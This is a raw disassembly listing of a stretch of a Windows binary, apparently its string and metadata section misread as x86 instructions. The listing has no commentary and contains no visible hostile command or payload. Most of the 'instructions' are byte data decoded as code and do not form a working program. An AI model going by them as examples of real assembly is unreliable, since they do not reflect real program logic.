  403be0:	outs   dx,BYTE PTR ds:[esi]
  403be1:	inc    ebx
  403be2:	outs   dx,DWORD PTR ds:[esi]
  403be3:	ins    DWORD PTR es:[edi],dx
  403be4:	ins    DWORD PTR es:[edi],dx
  403be5:	popa   
  403be6:	outs   dx,BYTE PTR ds:[esi]
  403be7:	fs inc ebp
  403be9:	js     0x403c4e
  403beb:	gs jo  0x403c62
  403bee:	imul   ebp,DWORD PTR [edi+0x6e],0x65755100
  403bf5:	jne    0x403c5c
  403bf7:	fs dec ebp
  403bf9:	popa   
  403bfa:	imul   ebp,DWORD PTR [ecx+ecx*2+0x74],0x65446d65
  403c02:	ins    BYTE PTR es:[edi],dx
  403c03:	gs je  0x403c6b
  403c06:	fs inc ebp
  403c08:	js     0x403c6d
  403c0a:	gs jo  0x403c81
  403c0d:	imul   ebp,DWORD PTR [edi+0x6e],0x69614d00
  403c14:	ins    BYTE PTR es:[edi],dx
  403c15:	dec    ecx
  403c16:	je     0x403c7d
  403c18:	ins    DWORD PTR es:[edi],dx
  403c19:	push   edx
  403c1a:	gs je  0x403c8f
  403c1d:	jns    0x403c62
  403c1f:	outs   dx,DWORD PTR ds:[esi]
  403c20:	jne    0x403c90
  403c22:	je     0x403c69
  403c24:	js     0x403c89
  403c26:	gs gs fs gs fs inc ebp
  403c2c:	js     0x403c91
  403c2e:	gs jo  0x403ca5
  403c31:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  403c38:	pop    edi
  403c39:	push   edx
  403c3a:	gs jno 0x403cb2
  403c3d:	gs jae 0x403cb4
  403c40:	add    BYTE PTR [ebx+0x6f],al
  403c43:	ins    DWORD PTR es:[edi],dx
  403c44:	ins    DWORD PTR es:[edi],dx
  403c45:	popa   
  403c46:	outs   dx,BYTE PTR ds:[esi]
  403c47:	fs push esp
  403c49:	jns    0x403cbb
  403c4b:	add    BYTE PTR gs:[edi+0x65],ah
  403c4f:	je     0x403cb0
  403c51:	inc    ebx
  403c52:	outs   dx,DWORD PTR ds:[esi]
  403c53:	ins    DWORD PTR es:[edi],dx
  403c54:	ins    DWORD PTR es:[edi],dx
  403c55:	popa   
  403c56:	outs   dx,BYTE PTR ds:[esi]
  403c57:	fs push esp
  403c59:	jns    0x403ccb
  403c5b:	add    BYTE PTR gs:[edi+0x65],ah
  403c5f:	je     0x403cc0
  403c61:	inc    esp
  403c62:	popa   
  403c63:	je     0x403cc6
  403c65:	inc    ecx
  403c66:	arpl   WORD PTR [ebx+0x65],sp
  403c69:	jae    0x403cde
  403c6b:	inc    ecx
  403c6c:	fs popa 
  403c6e:	jo     0x403ce4
  403c70:	gs jb  0x403c73
  403c73:	inc    edi
  403c74:	jne    0x403cdf
  403c76:	add    BYTE PTR fs:[edi+0x65],ah
  403c7a:	je     0x403cdb
  403c7c:	inc    ebx
  403c7d:	outs   dx,DWORD PTR ds:[esi]
  403c7e:	outs   dx,BYTE PTR ds:[esi]
  403c7f:	jbe    0x403ce6
  403c81:	jb     0x403cf6
  403c83:	popa   
  403c84:	je     0x403cef
  403c86:	outs   dx,DWORD PTR ds:[esi]
  403c87:	outs   dx,BYTE PTR ds:[esi]
  403c88:	dec    eax
  403c89:	popa   
  403c8a:	outs   dx,BYTE PTR ds:[esi]
  403c8b:	fs ins BYTE PTR es:[edi],dx
  403c8d:	add    BYTE PTR gs:[eax+0x6f],dl
  403c91:	jae    0x403d07
  403c93:	push   edx
  403c94:	gs jae 0x403d07
  403c97:	outs   dx,DWORD PTR ds:[esi]
  403c98:	outs   dx,BYTE PTR ds:[esi]
  403c99:	jae    0x403d00
  403c9b:	add    BYTE PTR [ebx+0x6f],al
  403c9e:	ins    DWORD PTR es:[edi],dx
  403c9f:	ins    DWORD PTR es:[edi],dx
  403ca0:	popa   
  403ca1:	outs   dx,BYTE PTR ds:[esi]
  403ca2:	fs push edx
  403ca4:	jne    0x403d14
  403ca6:	outs   dx,BYTE PTR ds:[esi]
  403ca7:	gs jb  0x403caa
  403caa:	push   edx
  403cab:	jne    0x403d1b
  403cad:	add    BYTE PTR [ebx+0x6c],al
  403cb0:	outs   dx,DWORD PTR ds:[esi]
  403cb1:	jae    0x403d18
  403cb3:	dec    ecx
  403cb4:	je     0x403d1b
  403cb6:	ins    DWORD PTR es:[edi],dx
  403cb7:	push   edx
  403cb8:	gs popa 
  403cba:	fs gs jb 0x403cbe
  403cbe:	inc    esp
  403cbf:	imul   esi,DWORD PTR [ebx+0x70],0x65736f
  403cc6:	dec    ecx
  403cc7:	outs   dx,BYTE PTR ds:[esi]
  403cc8:	je     0x403cfd
  403cca:	xor    al,BYTE PTR [eax]
  403ccc:	push   eax
  403ccd:	popa   
  403cce:	jb     0x403d43
  403cd0:	add    BYTE PTR gs:[ebx+0x79],dl
  403cd4:	jae    0x403d4a
  403cd6:	gs ins DWORD PTR es:[edi],dx
  403cd8:	cs inc ebx
  403cda:	outs   dx,DWORD PTR ds:[esi]
  403cdb:	outs   dx,BYTE PTR ds:[esi]
  403cdc:	imul   sp,WORD PTR [edi+0x75],0x6172
  403ce2:	je     0x403d4d
  403ce4:	outs   dx,DWORD PTR ds:[esi]
  403ce5:	outs   dx,BYTE PTR ds:[esi]
  403ce6:	add    BYTE PTR [ebx+0x6f],al
  403ce9:	outs   dx,BYTE PTR ds:[esi]
  403cea:	imul   sp,WORD PTR [edi+0x75],0x6172
  403cf0:	je     0x403d5b
  403cf2:	outs   dx,DWORD PTR ds:[esi]
  403cf3:	outs   dx,BYTE PTR ds:[esi]
  403cf4:	dec    ebp
  403cf5:	popa   
  403cf6:	outs   dx,BYTE PTR ds:[esi]
  403cf7:	popa   
  403cf8:	addr16 gs jb 0x403cfc
  403cfc:	push   ebx
  403cfd:	jns    0x403d72
  403cff:	je     0x403d66
  403d01:	ins    DWORD PTR es:[edi],dx
  403d02:	cs inc ebx
  403d04:	outs   dx,DWORD PTR ds:[esi]
  403d05:	ins    BYTE PTR es:[edi],dx
  403d06:	ins    BYTE PTR es:[edi],dx
  403d07:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403d0c:	outs   dx,BYTE PTR ds:[esi]
  403d0d:	jae    0x403d3d
  403d0f:	push   ebx
  403d10:	jo     0x403d77
  403d12:	arpl   WORD PTR [ecx+0x61],bp
  403d15:	ins    BYTE PTR es:[edi],dx
  403d16:	imul   edi,DWORD PTR [edx+0x65],0x614e0064
  403d1d:	ins    DWORD PTR es:[edi],dx
  403d1e:	gs push esi
  403d20:	popa   
  403d21:	ins    BYTE PTR es:[edi],dx
  403d22:	jne    0x403d89
  403d24:	inc    ebx
  403d25:	outs   dx,DWORD PTR ds:[esi]
  403d26:	ins    BYTE PTR es:[edi],dx
  403d27:	ins    BYTE PTR es:[edi],dx
  403d28:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403d2d:	outs   dx,BYTE PTR ds:[esi]
  403d2e:	add    BYTE PTR [edi+0x65],ah
  403d31:	je     0x403d92
  403d33:	inc    ecx
  403d34:	jo     0x403da6
  403d36:	push   ebx
  403d37:	gs je  0x403dae
  403d3a:	imul   ebp,DWORD PTR [esi+0x67],0x65670073
  403d41:	je     0x403da2
  403d43:	dec    ecx
  403d44:	je     0x403dab
  403d46:	ins    DWORD PTR es:[edi],dx
  403d47:	add    BYTE PTR [edi+ebp*2+0x53],dl
  403d4b:	je     0x403dbf
  403d4d:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  403d54:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  403d5b:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  403d62:	popa   
  403d63:	jb     0x403dce
  403d65:	jae    0x403dd6
  403d67:	outs   dx,BYTE PTR ds:[esi]
  403d68:	add    BYTE PTR [ebx+0x6f],al
  403d6b:	ins    DWORD PTR es:[edi],dx
  403d6c:	jo     0x403dcf
  403d6e:	jb     0x403dd5
  403d70:	add    BYTE PTR [ebx+0x6f],al
  403d73:	outs   dx,BYTE PTR ds:[esi]
  403d74:	outs   dx,BYTE PTR ds:[esi]
  403d75:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403d7a:	outs   dx,BYTE PTR ds:[esi]
  403d7b:	push   esp
  403d7c:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  403d83:	addr16 gs je 0x403de6
  403d87:	dec    ebp
  403d88:	gs jae 0x403dfe
  403d8b:	popa   
  403d8c:	add    BYTE PTR gs:[bp+di+0x6f],al
  403d91:	outs   dx,BYTE PTR ds:[esi]
  403d92:	jae    0x403e03
  403d94:	ins    BYTE PTR es:[edi],dx
  403d95:	add    BYTE PTR gs:[edi+0x72],dl
  403d99:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  403da1:	dec    ecx
  403da2:	jae    0x403df2
  403da4:	jne    0x403e12
  403da6:	ins    BYTE PTR es:[edi],dx
  403da7:	dec    edi
  403da8:	jb     0x403def
  403daa:	ins    DWORD PTR es:[edi],dx
  403dab:	jo     0x403e21
  403dad:	jns    0x403daf
  403daf:	inc    ecx
  403db0:	jb     0x403e19
  403db2:	jne    0x403e21
  403db4:	outs   dx,BYTE PTR gs:[esi]
  403db6:	je     0x403dfd
  403db8:	js     0x403e1d
  403dba:	gs jo  0x403e31
  403dbd:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  403dc4:	pop    edi
  403dc5:	dec    esp
  403dc6:	outs   dx,BYTE PTR gs:[esi]
  403dc8:	addr16 je 0x403e33
  403dcb:	add    BYTE PTR [edx+0x79],al
  403dce:	je     0x403e35
  403dd0:	add    BYTE PTR [ebx+0x75],dl
  403dd3:	bound  esi,QWORD PTR [ebx+0x74]
  403dd6:	jb     0x403e41
  403dd8:	outs   dx,BYTE PTR ds:[esi]
  403dd9:	add    BYTE PTR [bp+di+0x79],dl
  403ddd:	jae    0x403e53
  403ddf:	gs ins DWORD PTR es:[edi],dx
  403de1:	cs inc edi
  403de3:	ins    BYTE PTR es:[edi],dx
  403de4:	outs   dx,DWORD PTR ds:[esi]
  403de5:	bound  esp,QWORD PTR [ecx+0x6c]
  403de8:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403def:	add    BYTE PTR [ebx+0x75],al
  403df2:	ins    BYTE PTR es:[edi],dx
  403df3:	je     0x403e6a
  403df5:	jb     0x403e5c
  403df7:	dec    ecx
  403df8:	outs   dx,BYTE PTR ds:[esi]
  403df9:	outs   dx,WORD PTR ds:[esi]
  403dfb:	add    BYTE PTR [edi+0x65],ah
  403dfe:	je     0x403e5f
  403e00:	dec    ecx
  403e01:	outs   dx,BYTE PTR ds:[esi]
  403e02:	jbe    0x403e65
  403e04:	jb     0x403e6f
  403e06:	popa   
  403e07:	outs   dx,BYTE PTR ds:[esi]
  403e08:	je     0x403e4d
  403e0a:	jne    0x403e78
  403e0c:	je     0x403e83
  403e0e:	jb     0x403e75
  403e10:	add    BYTE PTR [esi+0x75],cl
  403e13:	ins    DWORD PTR es:[edi],dx
  403e14:	bound  esp,QWORD PTR [ebp+0x72]
  403e17:	inc    esi
  403e18:	outs   dx,DWORD PTR ds:[esi]
  403e19:	jb     0x403e88
  403e1b:	popa   
  403e1c:	je     0x403e67
  403e1e:	outs   dx,BYTE PTR ds:[esi]
  403e1f:	outs   dx,WORD PTR ds:[esi]
  403e21:	add    BYTE PTR [edi+0x65],ah
  403e24:	je     0x403e85
  403e26:	dec    esi
  403e27:	jne    0x403e96
  403e29:	bound  esp,QWORD PTR [ebp+0x72]
  403e2c:	inc    esi
  403e2d:	outs   dx,DWORD PTR ds:[esi]
  403e2e:	jb     0x403e9d
  403e30:	popa   
  403e31:	je     0x403e33
  403e33:	dec    esi
  403e34:	jne    0x403ea3
  403e36:	bound  esp,QWORD PTR [ebp+0x72]
  403e39:	push   ebx
  403e3a:	je     0x403eb5
  403e3c:	ins    BYTE PTR es:[edi],dx
  403e3d:	gs jae 0x403e40
  403e40:	dec    ecx
  403e41:	inc    esi
  403e42:	outs   dx,DWORD PTR ds:[esi]
  403e43:	jb     0x403eb2
  403e45:	popa   
  403e46:	je     0x403e98
  403e48:	jb     0x403eb9
  403e4a:	jbe    0x403eb5
  403e4c:	fs gs jb 0x403e50
  403e50:	add    BYTE PTR [ecx],cl
  403e52:	ins    DWORD PTR es:[edi],dx
  403e53:	add    BYTE PTR [ebx+0x0],dh
  403e56:	add    BYTE PTR fs:[edx+0x0],ah
  403e5a:	add    BYTE PTR [ebx],al
  403e5c:	add    BYTE PTR cs:[eax],al
  403e5f:	and    eax,0x610044
  403e64:	je     0x403e66
  403e66:	popa   
  403e67:	add    BYTE PTR [edx+0x0],ah
  403e6a:	popa   
  403e6b:	add    BYTE PTR [ebx+0x0],dh
  403e6e:	add    BYTE PTR gs:[ebx+0x0],dl
  403e72:	add    BYTE PTR gs:[edx+0x0],dh
  403e76:	jbe    0x403e78
  403e78:	add    BYTE PTR gs:[edx+0x0],dh
  403e7c:	dec    esi
  403e7d:	add    BYTE PTR [ecx+0x0],ah
  403e80:	ins    DWORD PTR es:[edi],dx
  403e81:	add    BYTE PTR [ebp+0x0],ah
  403e84:	add    BYTE PTR [ecx],bl
  403e86:	inc    esp
  403e87:	add    BYTE PTR [ecx+0x0],ah
  403e8a:	je     0x403e8c
  403e8c:	popa   
  403e8d:	add    BYTE PTR [edx+0x0],ah
  403e90:	popa   
  403e91:	add    BYTE PTR [ebx+0x0],dh
  403e94:	add    BYTE PTR gs:[esi+0x0],cl
  403e98:	popa   
  403e99:	add    BYTE PTR [ebp+0x0],ch
  403e9c:	add    BYTE PTR gs:[eax],al
  403e9f:	adc    eax,0x69004d
  403ea4:	jae    0x403ea6
  403ea6:	jae    0x403ea8
  403ea8:	imul   eax,DWORD PTR [eax],0x67006e
  403eae:	dec    ebx
  403eaf:	add    BYTE PTR [ebp+0x0],ah
  403eb2:	jns    0x403eb4
  403eb4:	add    BYTE PTR [ecx],ah
  403eb6:	inc    edi
  403eb7:	add    BYTE PTR [ebp+0x0],ah
  403eba:	je     0x403ebc
  403ebc:	inc    ebp
  403ebd:	add    BYTE PTR [esi+0x0],ch
  403ec0:	arpl   WORD PTR [eax],ax
  403ec2:	jb     0x403ec4
  403ec4:	jns    0x403ec6
  403ec6:	jo     0x403ec8
  403ec8:	je     0x403eca
  403eca:	imul   eax,DWORD PTR [eax],0x6e006f
  403ed0:	dec    ebx
  403ed1:	add    BYTE PTR [ebp+0x0],ah
  403ed4:	jns    0x403ed6
  403ed6:	add    BYTE PTR ds:0x73006d,ch
  403edc:	sub    eax,0x65006800
  403ee1:	add    BYTE PTR [eax+eax*1+0x70],ch
  403ee5:	add    BYTE PTR [edx],bh
  403ee7:	add    BYTE PTR [edi],ch
  403ee9:	add    BYTE PTR [edi],ch
  403eeb:	add    BYTE PTR [ebp+0x0],cl
  403eee:	push   ebx
  403eef:	add    BYTE PTR [esi],ch
  403ef1:	add    BYTE PTR [ebx+0x0],dl
  403ef4:	push   ecx
  403ef5:	add    BYTE PTR [eax+eax*1+0x43],cl
  403ef9:	add    BYTE PTR [ebx+0x0],al
  403efc:	add    BYTE PTR cs:[esi+0x0],dh
  403f00:	xor    DWORD PTR [eax],eax
  403f02:	xor    DWORD PTR [eax],eax
  403f04:	add    DWORD PTR [eax],eax
  403f06:	add    BYTE PTR [eax],al
  403f08:	sub    al,0x41
  403f0a:	out    dx,eax
  403f0b:	and    BYTE PTR [edx-0x3e],dh
  403f0e:	and    DWORD PTR [edx-0x78],eax
  403f11:	mov    dl,0x65
  403f13:	pop    edi
  403f14:	ins    DWORD PTR es:[edi],dx
  403f15:	xor    al,0x33
  403f17:	add    BYTE PTR es:[eax],cl
  403f1a:	mov    bh,0x7a
  403f1c:	pop    esp
  403f1d:	push   esi
  403f1e:	sbb    DWORD PTR [eax+eiz*8],esi
  403f21:	mov    DWORD PTR [eax],ecx
  403f23:	mov    DWORD PTR [ebp+ebx*2-0x337f7f33],eax
  403f2a:	xchg   ecx,eax
  403f2b:	add    eax,DWORD PTR [esi]
  403f2d:	adc    cl,BYTE PTR [ecx]
  403f2f:	add    eax,DWORD PTR [esi]
  403f31:	adc    cl,BYTE PTR [ecx+ecx*1]
  403f34:	and    BYTE PTR [ebx],al
  403f36:	add    DWORD PTR [edx],edx
  403f38:	or     eax,0xc121112
  403f3d:	add    esp,DWORD PTR [eax]
  403f3f:	add    BYTE PTR [ecx],al
  403f41:	add    al,0x20
  403f43:	add    BYTE PTR [edx],dl
  403f45:	or     DWORD PTR [eax+ebp*1],eax
  403f48:	add    BYTE PTR [edx],dl
  403f4a:	or     DWORD PTR [edx],eax
  403f4c:	push   es
  403f4d:	or     BYTE PTR [edx+ecx*1],al
  403f50:	add    BYTE PTR [eax],al
  403f52:	add    BYTE PTR [ebx],al
  403f54:	and    BYTE PTR [eax],al
  403f56:	add    al,BYTE PTR [edi]
  403f58:	and    BYTE PTR [ebx],al
  403f5a:	adc    cl,BYTE PTR ds:0xb080e0e
  403f60:	and    BYTE PTR [esi],al
  403f62:	add    DWORD PTR [esi],ecx
  403f64:	push   cs
  403f65:	or     BYTE PTR [ecx],dl
  403f67:	adc    eax,0x708051d
  403f6c:	and    BYTE PTR [edx],al
  403f6e:	adc    dl,BYTE PTR [ecx]
  403f70:	adc    cl,BYTE PTR ds:0x2000708
  403f76:	add    DWORD PTR [edx],edx
  403f78:	or     BYTE PTR [edx],dl
  403f7a:	sbb    DWORD PTR [eax+eax*1],eax
  403f7d:	add    DWORD PTR [ecx],eax
  403f7f:	sbb    al,0x2
  403f81:	push   es
  403f82:	push   cs
  403f83:	or     BYTE PTR [ebp+0x0],ch
  403f86:	jae    0x403f88
  403f88:	add    BYTE PTR fs:[edx+0x0],ah
  403f8c:	add    ch,BYTE PTR [esi]
  403f8e:	add    BYTE PTR [esp+edi*1],al
  403f91:	add    BYTE PTR [eax],al
  403f93:	add    BYTE PTR [eax+eax*1],al
  403f96:	add    BYTE PTR [eax],al
  403f98:	add    BYTE PTR [ebx],al
  403f9a:	push   es
  403f9b:	adc    DWORD PTR ds:0x204,edx
  403fa1:	add    BYTE PTR ds:0x1d010100,al
  403fa7:	push   cs
  403fa8:	pop    es
  403fa9:	add    BYTE PTR [edx],al
  403fab:	add    DWORD PTR [esi],ecx
  403fad:	adc    BYTE PTR ds:0x311005,bl
  403fb3:	xor    DWORD PTR [eax],eax
  403fb5:	add    BYTE PTR cs:[eax],dh
  403fb8:	add    BYTE PTR [esi],ch
  403fba:	add    BYTE PTR [eax],dh
  403fbc:	add    BYTE PTR [esi],ch
  403fbe:	add    BYTE PTR [eax],dh
  403fc0:	add    BYTE PTR [ebx+ecx*1],al
  403fc3:	add    BYTE PTR [eax],al
  403fc5:	add    BYTE PTR [esp+esi*1],al
  403fc8:	or     BYTE PTR [eax],al
  403fca:	add    BYTE PTR [eax],cl
  403fcc:	xor    DWORD PTR [eax],eax
  403fce:	xor    DWORD PTR [eax],eax
  403fd0:	add    BYTE PTR cs:[eax],dh
  403fd3:	add    BYTE PTR [eax],ch
  403fd5:	dec    ebp
  403fd6:	add    BYTE PTR [ecx+0x0],ch
  403fd9:	arpl   WORD PTR [eax],ax
  403fdb:	jb     0x403fdd
  403fdd:	outs   dx,DWORD PTR ds:[esi]
  403fde:	add    BYTE PTR [ebx+0x0],dh
  403fe1:	outs   dx,DWORD PTR ds:[esi]
  403fe2:	add    BYTE PTR [esi+0x0],ah
  403fe5:	je     0x403fe7
  403fe7:	and    BYTE PTR [eax],al
  403fe9:	push   ebx
  403fea:	add    BYTE PTR [ecx+0x0],dl
  403fed:	dec    esp
  403fee:	add    BYTE PTR [eax],ah
  403ff0:	add    BYTE PTR [ebx+0x0],dl
  403ff3:	add    BYTE PTR gs:[edx+0x0],dh
  403ff7:	jbe    0x403ff9
  403ff9:	add    BYTE PTR gs:[edx+0x0],dh
  403ffd:	sbb    BYTE PTR [eax+0x30007b],0x78
  404004:	add    BYTE PTR [edx+0x0],ah
  404007:	add    BYTE PTR fs:[edi],dh
  40400a:	add    BYTE PTR [esi+0x0],ah
  40400d:	aaa    
  40400e:	add    BYTE PTR [ebx+0x0],ah
  404011:	xor    BYTE PTR [eax],al
  404013:	add    BYTE PTR fs:[eax+eax*1],ch
  404017:	and    BYTE PTR [eax],al
  404019:	xor    BYTE PTR [eax],al
  40401b:	js     0x40401d
  40401d:	aaa    
  40401e:	add    BYTE PTR [ebx+0x0],ah
  404021:	xor    eax,DWORD PTR [eax]
  404023:	add    BYTE PTR ss:[eax+eax*1],ch
  404027:	and    BYTE PTR [eax],al
  404029:	xor    BYTE PTR [eax],al
  40402b:	js     0x40402d
  40402d:	xor    al,0x0
  40402f:	aaa    
  404030:	add    BYTE PTR [edx],dh
  404032:	add    BYTE PTR [ecx],dh
  404034:	add    BYTE PTR [eax+eax*1],ch
  404037:	and    BYTE PTR [eax],al
  404039:	jnp    0x40403b
  40403b:	xor    BYTE PTR [eax],al
  40403d:	js     0x40403f
  40403f:	popa   
  404040:	add    BYTE PTR [esi+0x0],ah
  404043:	sub    al,0x0
  404045:	and    BYTE PTR [eax],al
  404047:	xor    BYTE PTR [eax],al
  404049:	js     0x40404b
  40404b:	popa   
  40404c:	add    BYTE PTR [eax],bh
  40404e:	add    BYTE PTR [eax+eax*1],ch
  404051:	and    BYTE PTR [eax],al
  404053:	xor    BYTE PTR [eax],al
  404055:	js     0x404057
  404057:	bound  eax,QWORD PTR [eax]
  404059:	sub    al,0x0
  40405b:	and    BYTE PTR [eax],al
  40405d:	xor    BYTE PTR [eax],al
  40405f:	js     0x404061
  404061:	popa   
  404062:	add    BYTE PTR [edi],dh
  404064:	add    BYTE PTR [eax+eax*1],ch
  404067:	and    BYTE PTR [eax],al
  404069:	xor    BYTE PTR [eax],al
  40406b:	js     0x40406d
  40406d:	xor    BYTE PTR [eax],al
  40406f:	sub    al,0x0
  404071:	and    BYTE PTR [eax],al
  404073:	xor    BYTE PTR [eax],al
  404075:	js     0x404077
  404077:	add    BYTE PTR gs:[edx],dh
  40407a:	add    BYTE PTR [eax+eax*1],ch
  40407d:	and    BYTE PTR [eax],al
  40407f:	xor    BYTE PTR [eax],al
  404081:	js     0x404083
  404083:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  404088:	add    BYTE PTR [eax],ah
  40408a:	add    BYTE PTR [eax],dh
  40408c:	add    BYTE PTR [eax+0x0],bh
  40408f:	cmp    DWORD PTR [eax],eax
  404091:	add    BYTE PTR gs:[ebp+0x0],bh
  404095:	jge    0x404097
  404097:	push   ds
  404098:	push   ebx
  404099:	add    BYTE PTR [ecx+0x0],dl
  40409c:	dec    esp
  40409d:	add    BYTE PTR [eax],ah
  40409f:	add    BYTE PTR [ebx+0x0],dl
  4040a2:	add    BYTE PTR gs:[edx+0x0],dh
  4040a6:	jbe    0x4040a8
  4040a8:	add    BYTE PTR gs:[edx+0x0],dh
  4040ac:	and    BYTE PTR [eax],al
  4040ae:	xor    al,BYTE PTR [eax]
  4040b0:	xor    BYTE PTR [eax],al
  4040b2:	xor    DWORD PTR [eax],eax
  4040b4:	xor    al,BYTE PTR [eax]
  4040b6:	xor    cl,BYTE PTR [ebp+0x0]
  4040b9:	imul   eax,DWORD PTR [eax],0x720063
  4040bf:	outs   dx,DWORD PTR ds:[esi]
  4040c0:	add    BYTE PTR [ebx+0x0],dh
  4040c3:	outs   dx,DWORD PTR ds:[esi]
  4040c4:	add    BYTE PTR [esi+0x0],ah
  4040c7:	je     0x4040c9
  4040c9:	and    BYTE PTR [eax],al
  4040cb:	push   ebx
  4040cc:	add    BYTE PTR [ecx+0x0],dl
  4040cf:	dec    esp
  4040d0:	add    BYTE PTR [eax],ah
  4040d2:	add    BYTE PTR [ebx+0x0],dl
  4040d5:	add    BYTE PTR gs:[edx+0x0],dh
  4040d9:	jbe    0x4040db
  4040db:	add    BYTE PTR gs:[edx+0x0],dh
  4040df:	and    BYTE PTR [eax],al
  4040e1:	xor    al,BYTE PTR [eax]
  4040e3:	xor    BYTE PTR [eax],al
  4040e5:	xor    DWORD PTR [eax],eax
  4040e7:	xor    al,BYTE PTR [eax]
  4040e9:	push   es
  4040ea:	xor    DWORD PTR [eax],eax
  4040ec:	xor    DWORD PTR [eax],eax
  4040ee:	xor    BYTE PTR [eax],al
  4040f0:	or     dh,BYTE PTR [ebx+0x0]
  4040f3:	jno    0x4040f5
  4040f5:	ins    BYTE PTR es:[edi],dx
  4040f6:	add    BYTE PTR [ecx],dh
  4040f8:	add    BYTE PTR [ecx],dh
  4040fa:	add    BYTE PTR [edx],dh
  4040fc:	push   ebx
  4040fd:	add    BYTE PTR [ecx+0x0],dl
  404100:	dec    esp
  404101:	add    BYTE PTR [ebx+0x0],dl
  404104:	add    BYTE PTR gs:[edx+0x0],dh
  404108:	jbe    0x40410a
  40410a:	add    BYTE PTR gs:[edx+0x0],dh
  40410e:	inc    edx
  40410f:	add    BYTE PTR [edi+0x0],ch
  404112:	outs   dx,DWORD PTR ds:[esi]
  404113:	add    BYTE PTR [ebx+0x0],ch
  404116:	jae    0x404118
  404118:	dec    edi
  404119:	add    BYTE PTR [esi+0x0],ch
  40411c:	ins    BYTE PTR es:[edi],dx
  40411d:	add    BYTE PTR [ecx+0x0],ch
  404120:	outs   dx,BYTE PTR ds:[esi]
  404121:	add    BYTE PTR [ebp+0x0],ah
  404124:	add    BYTE PTR cs:[ecx],dh
  404127:	add    BYTE PTR [ecx],dh
  404129:	add    BYTE PTR [esi],ch
  40412b:	add    BYTE PTR [eax],dh
  40412d:	add    BYTE PTR [edx],bl
  40412f:	push   ebx
  404130:	add    BYTE PTR [ecx+0x0],dl
  404133:	dec    esp
  404134:	add    BYTE PTR [ebx+0x0],dl
  404137:	add    BYTE PTR gs:[edx+0x0],dh
  40413b:	jbe    0x40413d
  40413d:	add    BYTE PTR gs:[edx+0x0],dh
  404141:	xor    al,BYTE PTR [eax]
  404143:	xor    BYTE PTR [eax],al
  404145:	xor    DWORD PTR [eax],eax
  404147:	xor    al,BYTE PTR [eax]
  404149:	dec    eax
  40414a:	aaa    
  40414b:	add    BYTE PTR [esi+0x0],ah
  40414e:	add    BYTE PTR gs:[eax+eax*1],dh
  404152:	add    BYTE PTR ss:[ebx],dh
  404155:	add    BYTE PTR [eax],dh
  404157:	add    BYTE PTR [ecx+0x0],ah
  40415a:	sub    eax,0x33003000
  40415f:	add    BYTE PTR [ebx],dh
  404161:	add    BYTE PTR [eax],dh
  404163:	add    BYTE PTR ds:0x62003400,ch
  404169:	add    BYTE PTR [eax],dh
  40416b:	add    BYTE PTR [ecx],dh
  40416d:	add    BYTE PTR ds:0x35006100,ch
  404173:	add    BYTE PTR [ebp+0x0],ah
  404176:	add    BYTE PTR ss:0x37006100,ch
  40417d:	add    BYTE PTR [edi],dh
  40417f:	add    BYTE PTR [ebx+0x0],ah
  404182:	aaa    
  404183:	add    BYTE PTR [ecx+0x0],ah
  404186:	add    BYTE PTR fs:[ebx],dh
  404189:	add    BYTE PTR [eax+eax*1],dh
  40418c:	add    BYTE PTR gs:[edx+0x0],ah
  404190:	xor    BYTE PTR [eax],al
  404192:	dec    esp
  404193:	jnp    0x404195
  404195:	aaa    
  404196:	add    BYTE PTR [esi+0x0],ah
  404199:	xor    DWORD PTR [eax],eax
  40419b:	xor    al,BYTE PTR [eax]
  40419d:	xor    DWORD PTR [eax],eax
  40419f:	arpl   WORD PTR [eax],ax
  4041a1:	xor    eax,DWORD PTR [eax]
  4041a3:	xor    eax,0x66002d00
  4041a8:	add    BYTE PTR [eax],dh
  4041aa:	add    BYTE PTR [ecx],bh
  4041ac:	add    BYTE PTR ds:0x34002d00,dh
  4041b2:	add    BYTE PTR [edi],dh
  4041b4:	add    BYTE PTR [ecx+0x0],ah
  4041b7:	popa   
  4041b8:	add    BYTE PTR ds:0x63006200,ch
  4041be:	add    BYTE PTR [eax],dh
  4041c0:	add    BYTE PTR [eax+eax*1],dh
  4041c3:	sub    eax,0x32006400
  4041c8:	add    BYTE PTR [ecx],dh
  4041ca:	add    BYTE PTR [eax+eax*1],dh
  4041cd:	bound  eax,QWORD PTR [eax]
  4041cf:	arpl   WORD PTR [eax],ax
  4041d1:	xor    BYTE PTR [eax],al
  4041d3:	xor    al,0x0
  4041d5:	aaa    
  4041d6:	add    BYTE PTR [edx],dh
  4041d8:	add    BYTE PTR [edi],dh
  4041da:	add    BYTE PTR [ecx+0x0],ah
  4041dd:	jge    0x4041df
  4041df:	push   cs
  4041e0:	push   ebx
  4041e1:	add    BYTE PTR [ecx+0x0],dl
  4041e4:	dec    esp
  4041e5:	add    BYTE PTR [edx],dh
  4041e7:	add    BYTE PTR [eax],dh
  4041e9:	add    BYTE PTR [ecx],dh
  4041eb:	add    BYTE PTR [ecx],dh
  4041ed:	add    BYTE PTR [esi],cl
  4041ef:	dec    ebp
  4041f0:	add    BYTE PTR [ebx+0x0],dl
  4041f3:	push   ebx
  4041f4:	add    BYTE PTR [ecx+0x0],dl
  4041f7:	dec    esp
  4041f8:	add    BYTE PTR [ecx],dh
  4041fa:	add    BYTE PTR [ecx],dh
  4041fc:	add    BYTE PTR [ecx*2+0x41005300],cl
  404203:	add    BYTE PTR [ebx+0x0],dl
  404206:	xor    DWORD PTR [eax],eax
  404208:	xor    DWORD PTR [eax],eax
  40420a:	or     al,0x4d
  40420c:	add    BYTE PTR [ebx+0x0],dl
  40420f:	push   edx
  404210:	add    BYTE PTR [ebx+0x0],dl
  404213:	xor    DWORD PTR [eax],eax
  404215:	xor    DWORD PTR [eax],eax
  404217:	add    al,BYTE PTR [esi]
  404219:	or     DWORD PTR [esp+esi*4],eax
  40421c:	add    BYTE PTR [eax],al
  40421e:	add    BYTE PTR [edx],dl
  404220:	push   ebx
